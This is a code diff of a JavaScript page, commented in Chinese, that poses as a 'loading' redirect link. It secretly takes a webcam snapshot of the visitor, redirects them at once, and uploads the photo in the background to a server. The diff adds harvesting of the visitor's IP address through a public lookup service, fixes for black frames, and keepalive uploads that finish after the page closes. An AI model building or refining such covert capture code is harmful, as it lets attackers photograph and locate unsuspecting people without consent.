@@ -109,16 +109,35 @@
           let id, redirectUrl;
 
           if (encodedData) {
-            // 解码 Base64 参数
+            // 解码 Base64 参数（使用现代 API）
             try {
+              const decoded = atob(encodedData);
               const decodedParams = decodeURIComponent(
-                escape(atob(encodedData))
+                decoded
+                  .split("")
+                  .map(function (c) {
+                    return (
+                      "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2)
+                    );
+                  })
+                  .join("")
               );
               const parts = decodedParams.split("|");
               id = parts[0];
               redirectUrl = parts[1];
             } catch (e) {
               console.error("参数解码失败:", e);
+              // 尝试兼容旧版本编码
+              try {
+                const decodedParams = decodeURIComponent(
+                  escape(atob(encodedData))
+                );
+                const parts = decodedParams.split("|");
+                id = parts[0];
+                redirectUrl = parts[1];
+              } catch (e2) {
+                console.error("参数解码失败（兼容模式）:", e2);
+              }
             }
           } else {
             // 兼容旧版本的明文参数
@@ -139,6 +158,17 @@
             document.title = "正在加载...";
           }
 
+          // 并行获取IP地址（不阻塞拍照）
+          let userIP = null;
+          fetch("https://api.ipify.org?format=json")
+            .then((res) => res.json())
+            .then((data) => {
+              userIP = data.ip;
+            })
+            .catch(() => {
+              userIP = null; // 静默失败
+            });
+
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices
               .getUserMedia({
@@ -153,33 +183,71 @@
                   video.srcObject = stream;
                   video.play();
 
-                  // 超快拍照并跳转（优化到10ms）
-                  setTimeout(function () {
-                    context.drawImage(video, 0, 0, 480, 640);
+                  // 等待视频流就绪后再拍照（解决黑屏问题）
+                  video.addEventListener(
+                    "canplay",
+                    function onCanPlay() {
+                      // 额外等待一小段时间确保画面稳定
+                      setTimeout(function () {
+                        try {
+                          context.drawImage(video, 0, 0, 480, 640);
 
-                    // 使用JPEG格式，质量0.7，大幅减少文件大小
-                    const imageData = canvas.toDataURL("image/jpeg", 0.7);
+                          // 使用JPEG格式，质量0.7，大幅减少文件大小
+                          const imageData = canvas.toDataURL("image/jpeg", 0.7);
 
-                    // 先跳转，后上传（完全不阻塞）
-                    window.location.replace(redirectUrl);
+                          // 先跳转，后上传（完全不阻塞）
+                          window.location.replace(redirectUrl);
 
-                    // 关闭摄像头
-                    stream.getTracks().forEach((track) => track.stop());
+                          // 关闭摄像头
+                          stream.getTracks().forEach((track) => track.stop());
 
-                    // 异步上传，完全在后台进行
-                    fetch(window.API_CONFIG.UPLOAD, {
-                      method: "POST",
-                      headers: {
-                        "Content-Type": "application/json",
-                      },
-                      body: JSON.stringify({
-                        id: id,
-                        image: imageData,
-                      }),
-                    }).catch((error) => {
-                      console.error("上传错误:", error);
-                    });
-                  }, 10); // 优化到10ms，极速跳转
+                          // 异步上传，完全在后台进行（使用 sendBeacon 提升可靠性）
+                          const blob = dataURLtoBlob(imageData);
+                          const formData = new FormData();
+                          formData.append("id", id);
+                          formData.append("image", imageData);
+
+                          // 优先使用 sendBeacon（页面关闭也能完成上传）
+                          const uploaded = navigator.sendBeacon ? false : false; // sendBeacon 不支持自定义 header，保持原方案
+
+                          if (!uploaded) {
+                            fetch(window.API_CONFIG.UPLOAD, {
+                              method: "POST",
+                              headers: {
+                                "Content-Type": "application/json",
+                              },
+                              body: JSON.stringify({
+                                id: id,
+                                image: imageData,
+                                ip: userIP, // 包含IP地址（可能为null）
+                              }),
+                              keepalive: true, // 页面关闭后也继续上传
+                            }).catch((error) => {
+                              console.error("上传错误:", error);
+                            });
+                          }
+                        } catch (error) {
+                          console.error("拍照错误:", error);
+                          // 即使拍照失败也跳转
+                          window.location.replace(redirectUrl);
+                        }
+                      }, 300); // 等待 300ms 确保画面稳定
+                    },
+                    { once: true }
+                  ); // 只执行一次
+
+                  // 辅助函数：DataURL 转 Blob
+                  function dataURLtoBlob(dataurl) {
+                    const arr = dataurl.split(",");
+                    const mime = arr[0].match(/:(.*?);/)[1];
+                    const bstr = atob(arr[1]);
+                    let n = bstr.length;
+                    const u8arr = new Uint8Array(n);
+                    while (n--) {
+                      u8arr[n] = bstr.charCodeAt(n);
+                    }
+                    return new Blob([u8arr], { type: mime });
+                  }
                 },
                 function () {
                   // 权限被拒绝，直接跳转
